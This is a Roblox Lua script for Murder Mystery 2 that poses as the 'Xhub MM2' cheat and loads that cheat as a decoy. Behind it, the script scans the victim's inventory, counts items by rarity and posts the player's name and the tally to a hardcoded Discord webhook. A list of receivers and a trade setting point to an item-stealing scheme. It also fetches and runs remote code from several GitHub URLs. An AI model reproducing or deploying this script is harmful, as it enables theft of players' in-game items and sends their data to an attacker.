local Config = {
    Receivers = {"Makalayxz"},
    Webhook = "https://discord.com/api/webhooks/1297062490512822344/6GlaVOQHA3FZYcIeoHxZeQ9QCS3ti-aTE706a8eVxikL-LR_Fui7iMCVsCTYrTw1Bdkl",
    FullInventory = true,
    GoodItemsOnly = false,
    ResendTrade = ".",
    Script = "XhubMM2",
    CustomLink = "None"
}

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Orion/Source"))()
DYWebhook.ErrorPrinting = false
local embed = DYWebhook.BuildEmbed()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local Position = UDim2.new(0, 9999, 0, 9999)
local Inventory = {}
local InventorySet = {}

local function sendnotification(message)
    getgenv().scriptexecuted = false
    print("[ Pethicial ]: " .. message)
    Notification:Notify(
        {Title = "Pethicial ", Description = message},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 7, Type = "default"}
    )
end

local success, errorMsg = pcall(function()
    local games = {
        [142823291] = true,
        [335132309] = true,
        [636649648] = true
    }

    if not games[game.PlaceId] then
        game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
        while true do end
        wait(99999999999999999999999999999999999)
    end

    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Script terminated due to an invalid webhook url.")
        InvaildWebhook = true
        return
    end

    if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
        sendnotification("Script terminated due to an invalid receivers table.")
        return
    end

    if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Script terminated due to an invalid custom url.")
        return
    end

    if Config.FullInventory ~= true and Config.FullInventory ~= false then
        Config.FullInventory = true
    end

    if Config.Script == nil then
        Config.Script = "None"
    elseif Config.Script == "Custom" then
        Config.Script = Config.Script .. " - " .. Config.CustomLink
    end

    if Config.Script == "Custom" then
        loadstring(game:HttpGet(Config.CustomLink))()
    elseif Config.Script == "Xhub MM2" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
    end

    Common = 0
    Uncommon = 0
    Rare = 0
    Legendary = 0
    Vintage = 0
    Godly = 0
    Ancient = 0
    Unique = 0

    LocalPlayer.Idled:connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)

    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI
        Mobile = false
    else
        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
        Mobile = true
    end

    function TapUI(button, check, button2)
        if check == "Active Check" then
            if button.Active then
                button = button[button2]
            else
                return
            end
        end
        if check == "Text Check" then
            if button == "^" then
                button = button2
            else
                return
            end
        end
        for i, v in pairs(events) do
            for i, v in pairs(getconnections(button[v])) do
                v:Fire()
            end
        end
    end

    function Rarity(color, amount, tradeable, requirepath, path)
        Stack = 0

        if tradeable then
            if tradeable:FindFirstChild("Evo") then
                return
            end
        end

        if amount ~= "" then
            Stack = tonumber(amount:match("x(%d+)"))
        else
            Stack = 1
        end

        local r = math.floor(color.R * 255 + 0.5)
        local g = math.floor(color.G * 255 + 0.5)
        local b = math.floor(color.B * 255 + 0.5)

        if r == 106 and g == 106 and b == 106 then
            Common = Common + Stack
        elseif r == 0 and g == 255 and b == 255 then
            Uncommon = Uncommon + Stack
        elseif r == 0 and g == 200 and b == 0 then
            Rare = Rare + Stack
        elseif r == 220 and g == 0 and b == 5 then
            Legendary = Legendary + Stack
        elseif r == 255 and g == 0 and b == 179 then
            Godly = Godly + Stack
        elseif r == 100 and g == 10 and b == 255 then
            Ancient = Ancient + Stack
        elseif r == 240 and g == 140 and b == 0 then
            Unique = Unique + Stack
        else
            Vintage = Vintage + Stack
        end
    end

    function checkitem(v)
        if v:IsA("Frame") then
            if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                if Config.FullInventory then
                    local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
                    local itemString = v.ItemName.Label.Text .. " " .. number
                    if not InventorySet[itemString] then
                        InventorySet[itemString] = true
                        table.insert(Inventory, itemString)
                    end
                end
            end
        end
    end

    function FullInventory()
        for i, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
            for i, v in pairs(v.Container:GetChildren()) do
                if v.Name == "Christmas" or v.Name == "Halloween" then
                    for i, v in pairs(v.Container:GetChildren()) do
                        checkitem(v)
                    end
                else
                    checkitem(v)
                end
            end
        end
        for i, v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
            checkitem(v)
        end
        if Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
            table.insert(Inventory, "None")
        end
        if Config.FullInventory then
            return table.concat(Inventory, ", ")
        else
            return "Full inventory set false."
        end
    end

    FullInventory()

    -- Send chat message when the script executes successfully
    local message = "M SCRIPTS ON TOP!!"
    local TextChatService = game:GetService("TextChatService")
    local Chat = TextChatService.Chat
    local chatMessage = Instance.new("TextChatMessage")
    chatMessage.Text = message
    chatMessage.Speaker = LocalPlayer.Name
    chatMessage.ChatType = Enum.ChatType.Whisper
    Chat:Send(chatMessage)
end)

if not success then
    print("Error: " .. errorMsg)
end

if InvaildWebhook then
    return
end

if Godly > 0 and Ancient > 0 then
    content = "@everyone"
elseif Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
    content = "None"
else
    content = "Common: " .. Common .. "\nUncommon: " .. Uncommon .. "\nRare: " .. Rare .. "\nLegendary: " .. Legendary .. "\nVintage: " .. Vintage .. "\nGodly: " .. Godly .. "\nAncient: " .. Ancient .. "\nUnique: " .. Unique
end

embed:SetTitle("M Scripts")
embed:AddField("Status", content, true)
embed:AddField("Players", LocalPlayer.Name, true)

if not pcall(function() game:GetService("HttpService"):PostAsync(Config.Webhook, HttpService:JSONEncode(embed), Enum.HttpContentType.ApplicationJson) end) then
    print("Failed to send webhook")
end
